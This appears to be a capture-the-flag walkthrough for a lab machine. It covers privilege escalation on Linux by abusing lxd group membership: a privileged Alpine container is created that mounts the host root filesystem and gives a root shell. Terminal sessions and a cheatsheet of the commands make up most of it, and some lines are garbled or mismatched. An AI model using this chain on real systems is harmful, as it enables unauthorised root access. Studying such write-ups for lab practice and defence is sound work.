Adding lxc to path
```
mike@included:/dev/shm$ id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
mike@included:/dev/shm$ dpkg -l | grep lxd
ii  lxd                                    3.0.3-0ubuntu1~18.04.1                          amd64        Container hypervisor based on LXC - daemon
ii  lxd-client                             3.0.3-0ubuntu1~18.04.1                          amd64        Container hypervisor based on LXC - client
mike@included:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
mike@included:/dev/shm$ which lxc
/usr/bin/lxc

mike@included:/dev/shm$ export PATH="/usr/bin/lxc:$PATH"
mike@included:/dev/shm$ echo $PATH
/usr/bin/lxc:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```
mike@included:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2       8.8G  2.2G  6.5G  26% /
udev            965M     0  965M   0% /dev
tmpfs           997M  1.3M  996M   1% /dev/shm
tmpfs           200M  1.1M  199M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           997M     0  997M   0% /sys/fs/cgroup
/dev/loop0      100M  100M     0 100% /snap/core/11316
/dev/loop1      100M  100M     0 100% /snap/core/11743
tmpfs           200M     0  200M   0% /run/user/1000
tmpfs           100K     0  100K   0% /var/lib/lxd/shmounts
tmpfs           100K     0  100K   0% /var/lib/lxd/devlxd

```
Not seeing any available containers. Maybe one can be uploaded via tftp?
``
```
mike@included:~$ lxc list
+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+

```

## Possible ways forward
From Linux priv esc cheatsheet:
- `lxd init` # Start the LXD initialization process
- `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` # import a local image
- `lxc init alpine r00t -c security.privileged=true` # Start a privileged LxD container
- `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` # Mount the host filesystem in a container
- `lxc start r00t` # start the container

Also a guide here: https://techbrunch.github.io/patt-mkdocs/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#docker

## Uploading an alpine tar.gz
```
┌──(kali㉿kali)-[~/GitHub_Misc/lxd-alpine-builder]
└─$ tftp 10.129.95.185 69
tftp> put alpine-v3.13-x86_64-20210218_0139.tar.gz

mike@included:/tmp/ignore$ cp /var/lib/tftpboot/alpine-v3.13-x86_64-20210218_9.tar.gz .
mike@included:/tmp/ignore$ ls -l
total 4444
-rw-rw-r-- 1 mike mike 3259593 Aug 24 15:08 alpine-v3.13-x86_64-20210218_0139.tar.gz
-rw-rw-r-- 1 mike mike  166587 Aug 24 14:31 linpeas2.txt
-rwxrwxr-x 1 mike mike  954437 Aug 24 14:21 linpeas.sh
-rw-rw-r-- 1 mike mike  162831 Aug 24 14:23 linpeas.txt

```


# TODO: Fix output :)
```
mike@included:/tmp/ignore$ lxc image import ./al.tar.gz --alias alpine
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b                                                         
mike@included:/tmp/ignore$ lxc init alpine r00t -c security.privileged=true  
Creating r00t                                                                
mike@included:/tmp/ignore$ export PS1='\$'
$lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
Device mydev added to r00t
$lxc start r00t
$lxc exec r00t /bin/sh
~ # whoami
root
~ # id
uid=0(root) gid=0(root)
~ # df -h
Filesystem                Size      Used Available Use% Mounted on
/dev/sda2                 8.7G      2.2G      6.4G  25% /
none                    492.0K         0    492.0K   0% /dev
udev                    964.6M         0    964.6M   0% /dev/fuse
udev                    964.6M         0    964.6M   0% /dev/net/tun
tmpfs                   100.0K         0    100.0K   0% /dev/lxd
/dev/sda2                 8.7G      2.2G      6.4G  25% /mnt/root
udev                    964.6M         0    964.6M   0% /mnt/root/dev
tmpfs                   996.7M         0    996.7M   0% /mnt/root/dev/shm
tmpfs                   199.3M      1.0M    198.3M   1% /mnt/root/run
tmpfs                     5.0M         0      5.0M   0% /mnt/root/run/lock
tmpfs                   199.3M         0    199.3M   0% /mnt/root/run/user/1000
tmpfs                   996.7M         0    996.7M   0% /mnt/root/sys/fs/cgroup
/dev/loop0               99.4M     99.4M         0 100% /mnt/root/snap/core/11316
/dev/loop1               99.4M     99.4M         0 100% /mnt/root/snap/core/11743
tmpfs                   100.0K         0    100.0K   0% /mnt/root/var/lib/lxd/shmounts
tmpfs                   100.0K         0    100.0K   0% /mnt/root/var/lib/lxd/devlxd
tmpfs                   100.0K         0    100.0K   0% /dev/.lxd-mounts
tmpfs                   199.3M     40.0K    199.3M   0% /run
~ # ls -l /mnt/root/
bin/            initrd.img      mnt/            snap/           vmlinuz
boot/           initrd.img.old  opt/            srv/            vmlinuz.old
cdrom/          lib/            proc/           sys/
dev/            lib64/          root/           tmp/
etc/            lost+found/     run/            usr/
home/           media/          sbin/           var/
~ # ls -l /mnt/root/root/root.txt 
-r--------    1 root     root            33 Mar  9  2020 /mnt/root/root/root.txt
~ # md5sum /mnt/root/root/root.txt 
7ef07ff4703c59f103bdb88833f50666  /mnt/root/root/root.txt

```
## Import the alpine image
```
mike@included:/tmp/ignore$ lxc image import ./alpine-v3.13-x86_64-20210218_01tar.gz --alias alpine
```
## Run the image
```
mike@included:/tmp/ignore$ lxc init alpine r00t -c security.privileged=true
Creating r00t
```

## Mount the root file system to the image
```
mike@included:/tmp/ignore$ g
Device mydev added to r00t
```

## Start the container
```
mike@included:/tmp/ignore$ lxc start r00t
```

## Get a root shell :)
```
mike@included:/tmp/ignore$ lxc exec r00t /bin/sh
~ # id
uid=0(root) gid=0(root)

```

Not sure where the rest of the filesystem is...
```
/home # find / -name user.txt
/th=/mnt/root/home/mike/user.txt
find: /sys/kernel/debug: Permission denied
/home # find / -name root.txt
/th=/mnt/root/root/root.txt

```

# TODO: Fix line wrappings!
The comman for lxd is so long that the line wraps in the terminal and doesn't execute correctly!

```
mike@included:/var/lib/tftpboot$ stty cols 120
mike@included:/tmp/ignore$ export PS1='\$'
$
```

